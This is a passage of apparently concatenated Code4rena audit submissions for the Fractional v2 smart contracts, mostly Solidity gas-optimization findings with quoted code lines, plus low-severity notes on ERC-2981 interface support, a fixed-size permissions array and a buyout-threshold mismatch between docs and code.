https://blog.soliditylang.org/2021/04/21/custom-errors/ https://twitter.com/PatrickAlphaC/status/1505197417884528640  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L263 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L275 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L297 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L62 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L78  ## Recommended Mitigation Steps  Replace require blocks with new solidity errors described in https://blog.soliditylang.org/2021/04/21/custom-errors/  # [G-14] Bitshift for divide by 2  When multiply or dividing by a power of two, it is cheaper to bitshift than to use standard math operations.  There is a divide by 2 operation on these lines https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L100 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L136 https://github.com/code-423n4/2022-07-fractional/tree/main/src/utils/MerkleBase.sol#L142  ## Recommended Mitigation Steps  Bitshift right by one bit instead of dividing by 2 to save gas  # [G-15] Non-public variables save gas  Many constant variables are public, but changing the visibility of these variables to private or internal can save gas.  Locations where this was found include https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L15 https://github.com/code-423n4/2022-07-fractional/tree/main/src/FERC1155.sol#L17 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L35 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Buyout.sol#L37 https://github.com/code-423n4/2022-07-fractional/tree/main/src/modules/Migration.sol#L43  ## Recommended Mitigation Steps  Declare some public variables as private or internal to save gas  # [G-16] Write contracts in vyper  The contracts are all written entirely in solidity. Writing contracts with vyper instead of solidity can save gas.  Source https://twitter.com/eiber_david/status/1515737811881807876 doggo demonstrates https://twitter.com/fubuloubu/status/1528179581974417414?t=-hcq_26JFDaHdAQZ-wYxCA&s=19  ## Recommended Mitigation Steps  Write some or all of the contracts in vyper to save gas
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#L31-L34   # Vulnerability details  ## Impact  The [EIP-2981: NFT Royalty Standard](https://eips.ethereum.org/EIPS/eip-2981) implementation is incomplete, missing the implementation of `function supportsInterface(bytes4 interfaceID) external view returns (bool);` from the [EIP-165: Standard Interface Detection](https://eips.ethereum.org/EIPS/eip-165)  ## Proof of Concept  A marketplace implemented royalties could check if the NFT have royalties, but if don't add the interface of `ERC2981` on the `_registerInterface`, the marketplace can't know if this NFT haves  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Like in [solmate ERC1155.sol](https://github.com/Rari-Capital/solmate/blob/03e425421b24c4f75e4a3209b019b367847b7708/src/tokens/ERC1155.sol#L137-L146) add the `ERC2981` interfaceId on the `FERC1155` contract ```solidity     /*//////////////////////////////////////////////////////////////                               ERC165 LOGIC     //////////////////////////////////////////////////////////////*/      function supportsInterface(bytes4 interfaceId) public view  override returns (bool) {         return             super.supportsInterface(interfaceId) ||             interfaceId == 0x2a55205a; // ERC165 Interface ID for ERC2981     } ```  
## Low severity: BaseVault.sol deployVault() will revert if there are more than 6 Permissions in _modules  The list of Permission hashes is fixed at length 6 in generateMerkleTree [here](https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/protoforms/BaseVault.sol#L128): ``` hashes = new bytes32[](6); ```  However the _modules passed to deployVault might have more Permissions than 6.   **If there are more than 6 Permissions deployVault() will revert with raiseOutOfBounds**.  Consider counting up the number of Permissions first before creating the hashes array. Migration.generateMerkleTree does this [here]( https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Migration.sol#L487): ``` uint256 treeLength; uint256 modulesLength = _modules.length;  unchecked {     for (uint256 i; i < modulesLength; ++i) {         treeLength += IModule(_modules[i]).getLeafNodes().length;     } } ```  Marking low severity as if this limit is hit, a new protoform contract could be built, deployed and used. ie. it's not built into core contracts like the VaultRegistry.  ## Non-critical (until gas costs change): Vault.sol gas reserve setting not future proof'd like the one in PRBProxy  From the prb-proxy repo [README.md](https://github.com/paulrberg/prb-proxy/blob/main/README.md) `A minimum gas reserve is saved in storage such that the proxy does not become unusable if EVM opcode gas costs change in the future.`  In Vault.sol it's a `constant` so can't be modified in the future without redeploying the Vault and VaultFactory contracts.  This was probably done to save gas but consider making it modifiable for the future. Some Vault's will continue working for a long time and it's possible gas costs will change again in the future.  In the worst case the Vaults would fail to execute transactions due to out of gas failures.  **I marked this non-critical but if opcode costs were to change this could potentially become a high or critical.**  NOTE: This issue could also apply to `COST_PER_WORD` in Transfer.sol however there is a path to swap plugins and migrate Vaults to use new modules so it's less of an issue in contracts like Transfer.  ## Non-critical: FERC1155.sol implements EIP-2981 but does not include it in supportsInterface  There is no mention of the EIP2981 standard in the docs or code but the FERC1155 does implement that standard.  So it would benefit from returning true for calls to `supportsInterface(0x2a55205a)`. see https://eips.ethereum.org/EIPS/eip-2981 for details of the interface.  With that in place exchanges can see the standard is supported and attempt to honor the royalty setting.  ## Non-critical: Buyout percentage inconsistency between docs and code  The docs mention 51% as the required buyout threshold multiple times. For example `If a pool has more than 51% of the total supply after 4 days, the buyout is successful`. See https://docs.fractional.art/fractional-v2-1/smart-contracts/modules/buyout.  However the Buyout.sol logic uses 50%. For example see the check in the end() function here: https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Buyout.sol#L211.  Update either the docs or the code so they are consistently using one of either 50% or 51%.  ## Non-critical: Vault.sol state variable nonce can be bool  `nonce` in Vault.sol is used as a flag to indicate if the Vault has been initialized or not. However it's stored as a uint256.  Changing it to a bool would make it's purpose and usage a little clearer. It would also save 20k deployment gas if the `nonce` declaration was moved above `merkleRoot` when changed to bool. This is because it can share a slot with the address `owner`.  ## Non-critical: IBuyout.sol duplicates 2 functions from the parent IModule.sol  Functions `getLeafNodes` an `getPermissions` can be removed from IBuyout.sol as they are already defined in the parent contract IModule.sol. 
# Gas Report  ## Table of Contents  - [Array length should not be looked up in every iteration](#array-length-should-not-be-looked-up-in-every-iteration) - [Bytes constant are cheaper than string constants](#bytes-constants-are-cheaper-than-string-constants) - [Caching storage variables in local variables to save gas](#caching-storage-variables-in-local-variables-to-save-gas) - [Caching mapping accesses in local variables to save gas](#caching-mapping-accesses-in-local-variables-to-save-gas) - [Calldata instead of memory for RO function parameters](#calldata-instead-of-memory-for-ro-function-parameters) - [Constant expressions](#constant-expressions) - [Constants can be private](#constants-can-be-private) - [Custom errors](#custom-errors) - [Empty blocks should emit an event](#empty-blocks-should-emit-an-event) - [Event fields are redundant](#event-fields-are-redundant) - [Functions with access control cheaper if payable](#functions-with-access-control-cheaper-if-payable) - [Immutable variables save storage](#immutable-variables-save-storage) - [Inline functions](#inline-functions) - [Mathematical optimizations](#mathematical-optimizations) - [Modifier instead of duplicate require](#modifier-instead-of-duplicate-require) - [Prefix increments](#prefix-increments) - [Revert strings length](#revert-strings-length) - [Shifting cheaper than division](#shifting-cheaper-than-division) - [Storage cheaper than memory](#storage-cheaper-than-memory) - [Storage pointer for structs](#storage-pointer-for-structs) - [Transfers should be avoided if amount null](#transfers-should-be-avoided-if-amount-null) - [unchecked arithmetic](#unchecked-arithmetic) - [unnecessary computation](#unnecessary-computation)   # Array length should not be looked up in every iteration  ## IMPACT  It wastes gas to read an array's length in every iteration of a `for` loop, even if it is a memory or calldata array: `3` gas per read.   ## PROOF OF CONCEPT  8 instances:  ### src/modules/Buyout.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L454 ```cpp 454:         for (uint256 i; i < permissions.length; ) ```  ### src/modules/protoforms/BaseVault.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L64 ```cpp 64:         for (uint256 i = 0; i < _tokens.length; ) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L83 ```cpp 83:         for (uint256 i = 0; i < _tokens.length; ) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L107 ```cpp 107:         for (uint256 i = 0; i < _tokens.length; ++i) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L130 ```cpp 130:             for (uint256 i; i < _modules.length; ++i)  ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L132 ```cpp 132:             for (uint256 j; j < leaves.length; ++j)  ```  ### src/utils/MerkleBase.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L51 ```cpp 51:             for (uint256 i = 0; i < _proof.length; ++i) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L110 ```cpp 110:             for (uint256 i; i < result.length; ++i) ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Caching the length in a variable before the `for` loop   # Bytes constant are cheaper than string constants  ## IMPACT  If the string can fit into 32 bytes, then `bytes32` is cheaper than `string`. `string`  is a dynamically sized-type, which has current limitations in Solidity compared to a statically sized variable.    ## PROOF OF CONCEPT  2 instances:  ### src/FERC1155.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L15 ```cpp 15:     string public constant NAME = "FERC1155"; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L17 ```cpp 15:     string public constant VERSION = "1"; ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace `string constant` with `bytes(1..32) constant`  # Caching storage variables in local variables to save gas  ## IMPACT  Anytime you are reading from storage more than once, it is cheaper in gas cost to cache the variable: a SLOAD cost 100gas, while MLOAD and MSTORE cost 3 gas.  In particular, in `for` loops, when using the length of a storage array as the condition being checked after each loop, caching the array length can yield significant gas savings if the array length is high  ## PROOF OF CONCEPT  15 instances:  ### src/modules/Buyout.sol  scope: `end()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L186 - `registry` is read twice:  ```cpp 186:         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); 210:                IVaultRegistry(registry) ```  scope: `cash()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L246 - `registry` is read twice:  ```cpp 246:         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); 267:        uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault); ```  scope: `redeem()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L280 - `registry` is read twice:  ```cpp 280:         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); 288:         uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault); ```  scope: `getPermissions()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L476 - `supply` is read twice:  ```cpp 476:             supply, 477:             ISupply(supply).burn.selector ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L482 - `transfer` is read 8 times:  ```cpp 482:             transfer, 483:             ITransfer(transfer).ERC20Transfer.selector 488:             transfer, 489:             ITransfer(transfer).ERC721TransferFrom.selector 494:             transfer, 495:             ITransfer(transfer).ERC1155TransferFrom.selector 500:             transfer, 501:             ITransfer(transfer).ERC1155BatchTransferFrom.selector ```   ### src/modules/Migrations.sol  scope: `propose()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L81 - `registry` is read twice:  ```cpp 81:         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); 95:         proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(_vault); ```  scope: `commit()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L184 - `registry` is read twice:  ```cpp 184:         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault); 200:             IVaultRegistry(registry).totalSupply(_vault) ```  - `buyout` is read twice in the conditionnal `if` block:  ```cpp 208:             IFERC1155(token).setApprovalFor(address(buyout), id, true) 210:             IBuyout(buyout).start{value: proposal.totalEth}(_vault); ```  scope: `settleVault()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L232 - `proposal.modules` is read twice:  ```cpp 232:         bytes32[] memory merkleTree = generateMerkleTree(proposal.modules); 247:             proposal.modules ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L237 - `proposal.plugins` is read twice:  ```cpp 237:             proposal.plugins 248:             proposal.plugins ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L238 - `proposal.selectors` is read twice:  ```cpp 238:             proposal.selectors 249:             proposal.selectors ```   scope: `settleFractions()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L273 - `proposal.newVault` is read twice:  ```cpp 273:             proposal.newVault 283:             proposal.newVault ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L275 - `proposal.newFractionSupply` is read twice:  ```cpp 275:             proposal.newFractionSupply 285:             proposal.newFractionSupply ```  scope: `migrateFractions()`  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L435 - `registry` is read 3 times:  ```cpp 435:         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault) 467:         (address token, uint256 newFractionId) = IVaultRegistry(registry) 470:         uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L438 - `buyout` is read twice:  ```cpp 438:         (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo(_vault) 447:         (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo(_vault); ```   ## TOOLS USED  Manual Analysis  ## MITIGATION  cache these storage variables using local variables.  # Caching mapping accesses in local variables to save gas  ## IMPACT  Anytime you are reading from a mapping value more than once, it is cheaper in gas cost to cache it, by saving one `gkeccak256` operation - `30` gas.   ## PROOF OF CONCEPT  1 instance:  ### src/FERC1155.sol  scope: `uri()`  - `metadata[_id]` is read twice:  ```cpp 297:        require(metadata[_id] != address(0), "NO METADATA"); 298:         return IFERC1155(metadata[_id]).uri(_id) ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  cache these mapping accesses using local variables.  # Calldata instead of memory for RO function parameters  ## PROBLEM  If a reference type function parameter is read-only, it is cheaper in gas to use calldata instead of memory. Calldata is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory,but it alleviates the compiler from the `abi.decode()` step that copies each index of the calldata to the memory index, each iteration costing `60` gas.   ## PROOF OF CONCEPT  20 instances:  ### src/FERC1155.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L68 ```cpp 68:     function emitSetURI(uint256 _id, string memory _uri)  ```  ### src/Vault.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73 ```cpp 73:     function install(bytes4[] memory _selectors, address[] memory _plugins) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L101 ```cpp 101:     function uninstall(bytes4[] memory _selectors) ```  ### src/VaultRegistry.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L53 ```cpp 53:         address[] memory _plugins 54:         bytes4[] memory _selectors ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L70 ```cpp 70:         address[] memory _plugins 71:         bytes4[] memory _selectors ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L85 ```cpp 85:         address[] memory _plugins 86:         bytes4[] memory _selectors ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L105 ```cpp 105:         address[] memory _plugins 106:         bytes4[] memory _selectors ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L150 ```cpp 150:         address[] memory _plugins 151:         bytes4[] memory _selectors ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L168 ```cpp 168:         address[] memory _plugins 169:         bytes4[] memory _selectors ```  ### src/modules/Migration.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L487 ```cpp 487:     function generateMerkleTree(address[] memory _modules) ```  ### src/utils/MerkleBase.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L44 ```cpp 44:     function verifyProof(bytes32[] memory _proof) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L125 ```cpp 125:     function hashLevel(bytes32[] memory _data) ```  ### src/utils/Metadata.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/Metadata.sol#L24 ```cpp 24:     function setURI(uint256 _id, string memory _uri)  ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace `memory` with `calldata`   # Constant expressions  ## IMPACT  Constant expressions are [re-calculated each time they are in use](https://github.com/ethereum/solidity/issues/9232), costing an extra `97` gas than a constant every time they are called.   ## PROOF OF CONCEPT  3 instances include:  ### src/constants/Permit.sol  ```cpp 5: bytes32 constant DOMAIN_TYPEHASH = keccak256( 6:     "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)" 7: ); 8:  9: /// @dev The EIP-712 typehash for the permit struct used by the contract 10: bytes32 constant PERMIT_TYPEHASH = keccak256( 11:     "Permit(address owner,address operator,uint256 tokenId,bool approved,uint256 nonce,uint256 deadline)" 12: ); 13:  14: /// @dev The EIP-712 typehash for the permit all struct used by the contract 15: bytes32 constant PERMIT_ALL_TYPEHASH = keccak256( 16:     "PermitAll(address owner,address operator,bool approved,uint256 nonce,uint256 deadline)" 17: ); ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Mark these as `immutable` instead of `constant`  # Constants can be private  ## IMPACT  Marking constants as `private` save gas upon deployment, as the compiler does not have to create getter functions for these variables. It is worth noting that a `private` variable can still be read using either the verified contract source code or the bytecode. This may affect readability so this is left at the team's discretion  ## PROOF OF CONCEPT  6 instances:  ### src/VaultRegistry.sol  ```cpp 17:     address public immutable factory; 18:     /// @notice Address of FERC1155 token contract 19:     address public immutable fNFT; 20:     /// @notice Address of Implementation for FERC1155 token contract 21:     address public immutable fNFTImplementation; ```  ### src/modules/Buyout.sol  ```cpp 35:    uint256 public constant PROPOSAL_PERIOD = 2 days; 36:     /// @notice Time length of the rejection period 37:     uint256 public constant REJECTION_PERIOD = 4 days; ```  ### src/modules/Migration.sol  ```cpp 43:     uint256 public constant PROPOSAL_PERIOD = 7 days; ```    ## TOOLS USED  Manual Analysis  ## MITIGATION  Make the constants `private` instead of `public`   # Custom Errors  ## IMPACT  Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met) while providing the same amount of information, as explained [here](https://blog.soliditylang.org/2021/04/21/custom-errors/)  Custom errors are defined using the error statement  ## PROOF OF CONCEPT  5 instances:  ### src/FERC1155.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L263-L268 ```cpp 263:         require( 264:             msg.sender == _from || 265:                 isApprovedForAll[_from][msg.sender] || 266:                 isApproved[_from][msg.sender][_id], 267:             "NOT_AUTHORIZED" 268:         ) ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L275-L286 ```cpp 275:         require( 276:             _to.code.length == 0 277:                 ? _to != address(0) 278:                 : INFTReceiver(_to).onERC1155Received( 279:                     msg.sender, 280:                     _from, 281:                     _id, 282:                     _amount, 283:                     _data 284:                 ) == INFTReceiver.onERC1155Received.selector, 285:             "UNSAFE_RECIPIENT" 286:         ); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L297 ```cpp 297:         require(metadata[_id] != address(0), "NO METADATA"); ```  ### src/utils/MerkleBase.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L62 ```cpp 62:         require(_data.length > 1, "wont generate root for single leaf"); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L78 ```cpp 78:         require(_data.length > 1, "wont generate root for single leaf"); ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace require and revert statements with custom errors.  For instance, in `FERC1155.sol`:  ```diff -297:         require(metadata[_id] != address(0), "NO METADATA"); +if (metadata[_id] == address(0)) { +  revert NoMetadata(); +} ```  and define the custom error in the contract  ```diff +error NoMetadata(); ```  - original gas costs:\ ╭───────────────────┬─────────────────┬───────┬────────┬───────┬─────────╮ │ FERC1155 contract ┆                 ┆       ┆        ┆       ┆         │ ╞═══════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡ │ Deployment Cost   ┆ Deployment Size ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 1863562           ┆ 9340            ┆       ┆        ┆       ┆         │ ╰───────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯  - new gas costs with the changes made above - ie one require statement changed into a custom error:\ ╭───────────────────┬─────────────────┬───────┬────────┬───────┬─────────╮ │ FERC1155 contract ┆                 ┆       ┆        ┆       ┆         │ ╞═══════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡ │ Deployment Cost   ┆ Deployment Size ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 1857755           ┆ 9311            ┆       ┆        ┆       ┆         │ ╰───────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯  - `5807` gas saved upon deployment.  # Empty blocks should emit an event  ## PROBLEM  Empty blocks should emit an event, or revert. If not, they can simply be removed to save gas upon deployment. This is valid for `receive()` functions, but also `constructors`  ## PROOF OF CONCEPT  4 instances:  ### src/Vault.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L32 ```cpp 32:     receive() external payable {} ```  ### src/modules/Buyout.sol#L53  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L53 ```cpp 53:     receive() external payable {} ```  ### src/modules/Migration.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L63 ```cpp 63:     receive() external payable {} ```  ### src/utils/MerkleBase.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L8 ```cpp 8:     constructor() {} ```    ## TOOLS USED  Manual Analysis  ## MITIGATION  Emit an event in these blocks, or remove them altogether.   # Event fields are redundant  ## PROBLEM  `block.timestamp` and `block.number` are added to event information by default, explicitly adding them is a waste of gas.  ## PROOF OF CONCEPT  1 instance:  ### src/modules/Buyout.sol  ```cpp 100:        emit Start( 101:             _vault, 102:             msg.sender, 103:             block.timestamp, 104:             buyoutPrice, 105:             fractionPrice 106:         ); ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Remove the event field emitting `block.timestamp`, as it is redundant.  # Functions with access control cheaper if payable  ## PROBLEM  A function with access control marked as payable will be cheaper for legitimate callers: the compiler removes checks for `msg.value`, saving approximately `20` gas per function call.  ## PROOF OF CONCEPT  Instances:  ### src/FERC1155.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L56-L60 ```cpp 56:     function burn( 57:         address _from, 58:         uint256 _id, 59:         uint256 _amount 60:     ) external onlyRegistry ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L79-L84 ```cpp 79:     function mint( 80:         address _to, 81:         uint256 _id, 82:         uint256 _amount, 83:         bytes memory _data 84:     ) external onlyRegistry ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L198 ```cpp 198:     function setContractURI(string calldata _uri) external onlyController  ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L205-L207 ```cpp 205:     function setMetadata(address _metadata, uint256 _id) 206:         external 207:         onlyController ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L217-L221 ```cpp 217:     function setRoyalties( 218:         uint256 _id, 219:         address _receiver, 220:         uint256 _percentage 221:     ) external onlyController  ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L229-L231 ```cpp 229:     function transferController(address _newController) 230:         external 231:         onlyController ```  ### src/Vault.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L76 ```cpp 76:         if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L87 ```cpp 87:         if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L94 ```cpp 94:         if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L102 ```cpp 102:         if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Mark these functions as `payable`  # Immutable variables save storage  ## PROBLEM  If a variable is set in the constructor and never modified afterwards, marking it as `immutable` can save a storage slot - `20,000` gas. This also saves `97` gas on every read access of the variable.  ## PROOF OF CONCEPT  8 instances:  ### src/VaultFactory.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultFactory.sol#L15 ```cpp 15:     address public implementation ```  ### src/modules/Buyout.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L29-L33 ```cpp 29:     address public registry 31:     address public supply 33:     address public transfer ```  ### src/modules/Migration.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L37-L39 ```cpp 37:     address payable public buyout 39:     address public registry ```  ### src/modules/Minter.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L14 ```cpp 14:     address public supply; ```  ### src/modules/protoforms/BaseVault.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L19 ```cpp 19:     address public registry ```    ## TOOLS USED  Manual Analysis  ## MITIGATION  Mark these variables as `immutable`.  # Inline functions  ## PROBLEM  When we define internal functions to perform computation:  - The contract’s code size gets bigger - the function call consumes more gas than executing it as an inlined function (part of the code, without the function call)  When it does not affect readability, it is recommended to inline functions in order to save gas  ## PROOF OF CONCEPT  3 instances:  ### src/FERC1155.sol  ```cpp 324:    